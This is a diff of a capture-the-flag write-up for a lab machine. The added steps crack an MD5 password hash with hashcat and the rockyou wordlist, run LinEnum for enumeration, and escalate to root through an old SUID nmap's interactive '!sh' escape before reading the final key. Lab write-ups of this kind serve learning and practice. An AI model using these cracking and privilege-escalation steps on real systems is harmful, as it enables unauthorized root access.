@@ -32,9 +32,16 @@ Now we have shell access.
 
 ---
 
-### Flags
+> ls -la:
 
-> hashcat
+    * key-2-of-3 which is not readable by us
+    * password.raw-md5
+
+> cat password.raw-md5
+
+Let's crack it with rockyou
+
+> hashcat pass.hash /usr/share/wordlists/rockyou.txt
 
 ```
 c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
@@ -57,6 +64,7 @@ Candidates.#1....: promo2007 -> loserface1
 ```
 
 
+### PrivEsc
 
 > ./LinEnum.sh
 
@@ -83,6 +91,8 @@ Candidates.#1....: promo2007 -> loserface1
 -rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
 ```
 
+\# Help from writeups :
+
 old version of nmap which doesn't have --script 
 so: 
 > nmap --interactive
@@ -93,7 +103,9 @@ nmap> !sh
 # whoami
 whoami
 root
-```
-> cd /root
 
-> cat key-3-of-3.txt
+#cat /root/key-3-of-3.txt
+
+```
+
+The End!
